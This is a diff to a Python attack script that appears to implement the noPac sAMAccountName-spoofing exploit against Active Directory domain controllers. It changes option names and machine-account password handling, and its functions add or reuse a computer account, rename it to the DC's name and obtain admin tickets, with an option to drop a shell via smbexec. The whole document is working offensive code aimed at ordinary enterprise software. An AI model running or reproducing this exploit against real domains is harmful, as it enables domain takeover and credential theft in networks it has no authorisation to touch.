@@ -68,28 +68,37 @@ def exploit(dcfull,adminticket,options):
             logging.error(str(e))
 
 def samtheadmin(username, password, domain, options):
-    if options.no_add and not options.new_name:
-        logging.error(f'Net input a target with `-new-name` !')
+    if options.no_add and not options.target_name:
+        logging.error(f'Net input a target with `-target-name` !')
         return
-    if options.new_name:
-        new_computer_name = options.new_name
+    if options.target_name:
+        new_computer_name = options.target_name
     else:
         new_computer_name = 'WIN-'+''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()
 
     if new_computer_name[-1] != '$':
         new_computer_name += '$'
 
-    if options.old_hash:
-        if ":" not in options.old_hash:
-            logging.error("Hash format error.")
+    if options.no_add:
+        if options.old_hash:
+            if ":" not in options.old_hash:
+                logging.error("Hash format error.")
+                return
+            options.old_pass = options.old_hash
+
+        if options.old_pass:
+            new_computer_password = options.old_pass
+        else:
+            # if change the computer password, trust relationship between target computer and the primary domain may failed !
+            logging.error("Net input the password with `-old-pass` or `-old-hash` !")
             return
-        options.old_pass = options.old_hash
-    if options.old_pass:
-        new_computer_password = options.old_pass
-    elif options.new_pass:
-        new_computer_password = options.new_pass
     else:
-        new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+        options.old_pass = options.old_hash = ""
+        if options.new_pass:
+            new_computer_password = options.new_pass
+        else:
+            new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+
 
     domain, username, password, lmhash, nthash = parse_identity(options)
     ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
@@ -114,7 +123,7 @@ def samtheadmin(username, password, domain, options):
 
     dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
     if dn and options.no_add:
-        logging.info(f'{new_computer_name} already exists! Using force mode.')
+        logging.info(f'{new_computer_name} already exists! Using no-add mode.')
         if not options.old_pass:
             if options.use_ldap:
                 logging.error(f'Modify password need ldaps !')
@@ -203,7 +212,7 @@ def samtheadmin(username, password, domain, options):
         if ldap_session.result['result'] == 0:
             logging.info(f'{new_computer_name} sAMAccountName == {dc_host}')
         else:
-            logging.error('Cannot rename the machine account , target patched')
+            logging.error('Cannot rename the machine account , Reson {}'.format(ldap_session.result['message']))
             if not options.no_add:
                 del_added_computer(ldap_session, domain_dumper,new_computer_name)
             return
@@ -273,10 +282,10 @@ if __name__ == '__main__':
                                                               'delegation to the SPN specified')
 
     parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
-    parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Target computer name, if not specified, will be random generated.')
+    parser.add_argument('-target-name', action='store', metavar='NEWNAME', help='Target computer name, if not specified, will be random generated.')
     parser.add_argument('-new-pass', action='store', metavar='PASSWORD', help='Add new computer password, if not specified, will be random generated.')
-    parser.add_argument('-old-pass', action='store', metavar='PASSWORD', help='Target computer password, use if you know the password of the target you input with -new-name.')
-    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH', help='Target computer hashes, use if you know the hash of the target you input with -new-name.')
+    parser.add_argument('-old-pass', action='store', metavar='PASSWORD', help='Target computer password, use if you know the password of the target you input with -target-name.')
+    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH', help='Target computer hashes, use if you know the hash of the target you input with -target-name.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
